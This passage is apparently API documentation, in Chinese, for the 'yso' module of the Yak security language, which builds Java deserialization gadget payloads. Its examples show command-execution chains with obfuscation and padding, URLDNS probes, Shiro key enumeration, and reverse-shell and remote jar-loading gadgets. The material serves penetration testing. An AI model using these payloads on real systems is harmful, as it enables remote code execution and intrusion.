	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````


#### 定义

`GetCommonsCollections8JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetCommonsCollectionsK1JavaObject

#### 详细描述
GetCommonsCollectionsK1JavaObject 基于Commons Collections &lt;=3.2.1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

参数:

  - options: 用于配置Java对象的可变参数函数列表



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollectionsK1JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````


#### 定义

`GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetCommonsCollectionsK2JavaObject

#### 详细描述
GetCommonsCollectionsK2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

参数:

  - options: 用于配置Java对象的可变参数函数列表



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollectionsK2JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````


#### 定义

`GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetCommonsCollectionsK3JavaObject

#### 详细描述
GetCommonsCollectionsK3JavaObject 基于Commons Collections K3 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

参数:

  - cmd: 要设置在Java对象中的命令字符串



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetCommonsCollectionsK3JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````


#### 定义

`GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` | 要设置在Java对象中的命令字符串 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetCommonsCollectionsK4JavaObject

#### 详细描述
GetCommonsCollectionsK4JavaObject 基于Commons Collections K4 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

参数:

  - cmd: 要设置在Java对象中的命令字符串



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetCommonsCollectionsK4JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````


#### 定义

`GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` | 要设置在Java对象中的命令字符串 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetFindGadgetByDNSJavaObject

#### 详细描述
GetFindGadgetByDNSJavaObject 通过 DNSLOG 探测 CLass Name，进而探测 Gadget。

使用预定义的FindGadgetByDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。

参数:

  - url: 要在生成的Java对象中设置的URL字符串



返回值:

  - 构造好的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
url, token, _ = risk.NewDNSLogDomain()
javaObject, _ = yso.GetFindGadgetByDNSJavaObject(url)
gadgetBytes,_ = yso.ToBytes(javaObject)
使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
res,err = risk.CheckDNSLogByToken(token)

	if err {
	  //dnslog查询失败
	} else {
	  if len(res) > 0{
	   // dnslog查询成功
	  }
	}
``````````````


#### 定义

`GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| url | `string` | 要在生成的Java对象中设置的URL字符串 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 构造好的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetGadget

#### 详细描述
GenerateGadget this is a highly flexible function that can generate a Java object by three different ways:

 1. Generate a Java object that have no any params.

    
Example:

``````````````yak
2. Generate a Java object that have one param and implement by TemplateImpl, the first param is the name of the gadget, the second param is the class name, the third param is the class param.
    Example: GenerateGadget("CommonsCollections2", "Sleep", "1000")
 3. Generate a Java object that have multiple params and implement by TemplateImpl, the first param is the name of the gadget, the second param is the class name, the third param is the class param map.
    Example: GenerateGadget("CommonsCollections2", "TcpReverseShell", map[string]string{"host": "127.0.0.1","port":"8080"})
 4. Generate a Java object that have one param and implement by TransformChain, the first param is the name of the gadget, the second param is the transform chain name, the third param is the param.
    Example: GenerateGadget("CommonsCollections1", "dnslog", "xxx.xx.com")
 5. Generate a Java object that have multiple params and implement by TransformChain, the first param is the name of the gadget, the second param is the transform chain name, the third param is the param map.
    Example: GenerateGadget("CommonsCollections1", "loadjar", map[string]string{"url": "xxx.com", "name": "exp"})
 6. Generate a Java object that implement by TemplateImpl.
    Example: GenerateGadget("CommonsCollections2", useRuntimeExecEvilClass("whoami"))

参数:
  - name: gadget 名称，例如 "CommonsCollections1"
  - opts: 可变参数，可为类名/参数字符串、参数 map 或 GenClassOptionFun 配置项

返回值:
  - 生成的 Java 对象
  - 错误信息，失败时非 nil

Example:
javaObject, err := yso.GetGadget("CommonsCollections1", "dnslog", "xxx.dnslog.cn")
``````````````


#### 定义

`GetGadget(name string, opts ...any) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| name | `string` | gadget 名称，例如 &#34;CommonsCollections1&#34; |
| opts | `...any` | 可变参数，可为类名/参数字符串、参数 map 或 GenClassOptionFun 配置项 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetGadgetNameByFun

#### 详细描述
GetGadgetNameByFun 从函数指针获取 gadget 名称，通过解析函数名来提取。

函数名需要符合 &#34;Get*JavaObject&#34; 格式，返回中间的 * 部分作为 gadget 名称

参数:

  - i: gadget 生成函数的函数指针



返回值:

  - 解析出的 gadget 名称

  - 错误信息，失败时非 nil




Example:

``````````````yak
name, err := GetGadgetNameByFun(GetCommonsBeanutils1JavaObject)
// name = "CommonsBeanutils1"
``````````````


#### 定义

`GetGadgetNameByFun(i any) (string, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| i | `any` | gadget 生成函数的函数指针 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `string` | 解析出的 gadget 名称 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetGroovy1JavaObject

#### 详细描述
GetGroovy1JavaObject 基于Groovy1 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

参数:

  - cmd: 要设置在Java对象中的命令字符串



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetGroovy1JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````


#### 定义

`GetGroovy1JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` | 要设置在Java对象中的命令字符串 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetJBossInterceptors1JavaObject

#### 详细描述
GetJBossInterceptors1JavaObject 基于JBossInterceptors1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

参数:

  - options: 用于配置Java对象的可变参数函数列表



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetJBossInterceptors1JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````


#### 定义

`GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetJSON1JavaObject

#### 详细描述
GetJSON1JavaObject 基于JSON1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

参数:

  - options: 用于配置Java对象的可变参数函数列表



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetJSON1JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````


#### 定义

`GetJSON1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetJavaObjectFromBytes

#### 详细描述
GetJavaObjectFromBytes 从字节数组中解析并返回第一个Java对象。

此函数使用ParseJavaSerialized方法来解析提供的字节序列，

并期望至少能够解析出一个有效的Java对象。如果解析失败或者结果为空，

函数将返回错误。如果解析成功，它将返回解析出的第一个Java对象。

参数:

  - byt: 要解析的字节数组



返回值:

  - 解析出的第一个 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
raw := "rO0..." // base64 Java serialized object
bytes = codec.DecodeBase64(raw)~ // base64解码
javaObject, err := yso.GetJavaObjectFromBytes(bytes) // 从字节中解析Java对象
``````````````


#### 定义

`GetJavaObjectFromBytes(byt []byte) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| byt | `[]byte` | 要解析的字节数组 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 解析出的第一个 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetJavassistWeld1JavaObject

#### 详细描述
GetJavassistWeld1JavaObject 基于JavassistWeld1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

参数:

  - options: 用于配置Java对象的可变参数函数列表



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetJavassistWeld1JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````


#### 定义

`GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetJdk7u21JavaObject

#### 详细描述
GetJdk7u21JavaObject 基于Jdk7u21 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

参数:

  - options: 用于配置Java对象的可变参数函数列表



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetJdk7u21JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````


#### 定义

`GetJdk7u21JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetJdk8u20JavaObject

#### 详细描述
GetJdk8u20JavaObject 基于Jdk8u20 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

参数:

  - options: 用于配置Java对象的可变参数函数列表



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetJdk8u20JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````


#### 定义

`GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetSimplePrincipalCollectionJavaObject

#### 详细描述
GetSimplePrincipalCollectionJavaObject 基于SimplePrincipalCollection 序列化模板生成并返回一个Java对象。

主要用于 Shiro 漏洞检测时判断 rememberMe cookie 的个数。

使用一个空的 SimplePrincipalCollection作为 payload，序列化后使用待检测的秘钥进行加密并发送，秘钥正确和错误的响应表现是不一样的，可以使用这个方法来可靠的枚举 Shiro 当前使用的秘钥。



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
javaObject, _ = yso.GetSimplePrincipalCollectionJavaObject()
classBytes,_ = yso.ToBytes(javaObject)
data = codec.PKCS5Padding(classBytes, 16)
keyDecoded,err = codec.DecodeBase64("kPH+bIxk5D2deZiIxcaaaA==")
iv = []byte(ramdstr(16))
cipherText ,_ = codec.AESCBCEncrypt(keyDecoded, data, iv)
payload = codec.EncodeBase64(append(iv, cipherText...))
发送 payload
``````````````


#### 定义

`GetSimplePrincipalCollectionJavaObject() (*JavaObject, error)`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetURLDNSJavaObject

#### 详细描述
GetURLDNSJavaObject 利用Java URL类的特性，生成一个在反序列化时会尝试对提供的URL执行DNS查询的Java对象。

这个函数首先使用预定义的URLDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。

参数:

  - url: 要在生成的Java对象中设置的URL字符串



返回值:

  - 构造好的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
url, token, _ = risk.NewDNSLogDomain()
javaObject, _ = yso.GetURLDNSJavaObject(url)
gadgetBytes,_ = yso.ToBytes(javaObject)
使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
res,err = risk.CheckDNSLogByToken(token)

	if err {
	  //dnslog查询失败
	} else {
	  if len(res) > 0{
	   // dnslog查询成功
	  }
	}
``````````````


#### 定义

`GetURLDNSJavaObject(url string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| url | `string` | 要在生成的Java对象中设置的URL字符串 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 构造好的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### LoadClassFromBCEL

#### 详细描述
LoadClassFromBCEL 将BCEL（Byte Code Engineering Library）格式的Java类数据转换为字节数组，

并从这些字节中加载并返回一个javaclassparser.ClassObject对象。

这个函数首先使用javaclassparser.Bcel2bytes转换BCEL格式的数据，然后利用GenerateClassObjectFromBytes生成类对象。

可通过可变参数`options`来定制类对象的特定属性或行为。

参数:

  - data: BCEL 格式的 Java 类数据



参数:

  - options: 用于配置类对象的可变参数函数列表



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
bcelData := "$$BECL$$..." // 假设的BCEL数据
classObject, err := LoadClassFromBCEL(bcelData, option1, option2) // 从BCEL数据加载并配置类对象
``````````````


#### 定义

`LoadClassFromBCEL(data string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| data | `string` | BCEL 格式的 Java 类数据 |
| options | `...GenClassOptionFun` | 用于配置类对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### LoadClassFromBase64

#### 详细描述
LoadClassFromBase64 从base64编码的字符串中加载并返回一个javaclassparser.ClassObject对象。

这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。

这些参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。

参数:

  - base64: 要从中加载类对象的 base64 编码字符串

  - options: 用于配置类对象的可变参数函数列表



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
classObject, _ := yso.LoadClassFromBytes("yv66vg...") // 从字节中加载并配置类对象
``````````````


#### 定义

`LoadClassFromBase64(base64 string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| base64 | `string` | 要从中加载类对象的 base64 编码字符串 |
| options | `...GenClassOptionFun` | 用于配置类对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### LoadClassFromBytes

#### 详细描述
LoadClassFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。

这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。

这些参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。

参数:

  - bytes: 要从中加载类对象的字节数组



参数:

  - options: 用于配置类对象的可变参数函数列表



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
bytesCode,_ =codec.DecodeBase64("yv66vg...")
classObject, _ := yso.LoadClassFromBytes(bytesCode) // 从字节中加载并配置类对象
``````````````


#### 定义

`LoadClassFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| bytes | `[]byte` | 要从中加载类对象的字节数组 |
| options | `...GenClassOptionFun` | 用于配置类对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### ToBcel

#### 详细描述
ToBcel 将 Java 类对象转换为 BCEL 编码格式的字符串

参数:

  - i: Java 类对象(*javaclassparser.ClassObject)



返回值:

  - BCEL 编码格式的字符串

  - 错误信息，失败时非 nil




Example:

``````````````yak
classObj := &javaclassparser.ClassObject{...}
bcelStr, err := yso.ToBcel(classObj)
``````````````


#### 定义

`ToBcel(i any) (string, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| i | `any` | Java 类对象(*javaclassparser.ClassObject) |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `string` | BCEL 编码格式的字符串 |
| r2 | `error` | 错误信息，失败时非 nil |


### ToBytes

#### 详细描述
ToBytes 将 Java 或反序列化对象转换为字节码

参数:

  - i: Java 类对象或反序列化对象

  - opts: 可选的序列化配置项，例如 dirtyDataLength、twoBytesCharString 等



返回值:

  - 序列化后的字节码

  - 错误信息，失败时非 nil




Example:

``````````````yak
gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.dirtyDataLength(10000),yso.twoBytesCharString())
``````````````


#### 定义

`ToBytes(i any, opts ...MarshalOptionFun) ([]byte, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| i | `any` | Java 类对象或反序列化对象 |
| opts | `...MarshalOptionFun` | 可选的序列化配置项，例如 dirtyDataLength、twoBytesCharString 等 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `[]byte` | 序列化后的字节码 |
| r2 | `error` | 错误信息，失败时非 nil |


### ToJson

#### 详细描述
ToJson 将 Java 或反序列化对象转换为 json 字符串

参数:

  - i: Java 类对象或反序列化对象



返回值:

  - json 字符串

  - 错误信息，失败时非 nil




Example:

``````````````yak
gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
gadgetJson,_ = yso.ToJson(gadgetObj)
``````````````


#### 定义

`ToJson(i any) (string, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| i | `any` | Java 类对象或反序列化对象 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `string` | json 字符串 |
| r2 | `error` | 错误信息，失败时非 nil |


### command

#### 详细描述
SetExecCommand

command 请求参数选项函数，用于设置要执行的命令。需要配合 useRuntimeExecTemplate 使用。

参数:

  - cmd: 要执行的命令字符串



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.command("whoami"),yso.useRuntimeExecTemplate())
``````````````


#### 定义

`command(cmd string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` | 要执行的命令字符串 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### dirtyDataLength

#### 详细描述
SetToBytesDirtyDataLength 设置序列化数据中脏数据的长度

参数:

  - length: 要设置的脏数据长度



返回值:

  - 用于配置序列化的选项函数




Example:

``````````````yak
gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.dirtyDataLength(10000))
``````````````


#### 定义

`dirtyDataLength(length int) MarshalOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| length | `int` | 要设置的脏数据长度 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `MarshalOptionFun` | 用于配置序列化的选项函数 |


### dnslogDomain

#### 详细描述
SetDnslog

dnslogDomain 请求参数选项函数，设置指定的 Dnslog 域名，需要配合 useDnslogTemplate 使用。

参数:

  - addr: 要设置的 Dnslog 域名



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
``````````````


#### 定义

`dnslogDomain(addr string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| addr | `string` | 要设置的 Dnslog 域名 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### dump

#### 详细描述
dump 将Java 对象转换为类 Java 代码

参数:

  - i: Java 类对象或反序列化对象



返回值:

  - 类 Java 代码字符串

  - 错误信息，失败时非 nil




Example:

``````````````yak
gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
gadgetDump,_ = yso.dump(gadgetObj)
``````````````


#### 定义

`dump(i any) (string, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| i | `any` | Java 类对象或反序列化对象 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `string` | 类 Java 代码字符串 |
| r2 | `error` | 错误信息，失败时非 nil |


### evilClassName

#### 详细描述
SetClassName

evilClassName 请求参数选项函数，用于设置生成的类名。

参数:

  - className: 要设置的类名



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.evilClassName("EvilClass"))
``````````````


#### 定义

`evilClassName(className string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| className | `string` | 要设置的类名 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### majorVersion

#### 详细描述
SetMajorVersion

majorVersion 请求参数选项函数，用于设置生成的 Java 类文件的 major 版本号(取值范围 45-62，超出范围回退为 52)。

参数:

  - v: Java 类文件的 major 版本号，取值范围 45-62



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"),yso.majorVersion(52))
``````````````


#### 定义

`majorVersion(v uint16) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| v | `uint16` | Java 类文件的 major 版本号，取值范围 45-62 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### obfuscationClassConstantPool

#### 详细描述
SetObfuscation

obfuscationClassConstantPool 请求参数选项函数，用于设置是否混淆类常量池。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.obfuscationClassConstantPool())
``````````````


#### 定义

`obfuscationClassConstantPool() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
